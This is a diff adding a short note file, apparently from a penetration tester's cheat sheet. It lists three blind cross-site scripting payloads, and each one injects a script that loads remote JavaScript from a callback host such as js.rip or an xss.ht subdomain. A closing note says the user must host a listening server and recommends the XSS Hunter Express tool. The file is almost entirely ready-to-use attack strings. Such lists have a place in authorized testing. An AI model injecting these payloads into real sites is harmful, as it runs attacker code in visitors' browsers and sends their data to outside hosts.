@@ -1,0 +1,10 @@
+Blind XSS payloads:
+"><script src="https://js.rip/<custom.name>"></script>
+"><script src=//<custom.subdomain>.xss.ht></script>
+<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
+
+NOTE:
+- You need to have a server hosted somewhere that can be pinged by your blind xss payloads!
+
+Recommendation: 
+https://github.com/mandatoryprogrammer/xsshunter-express
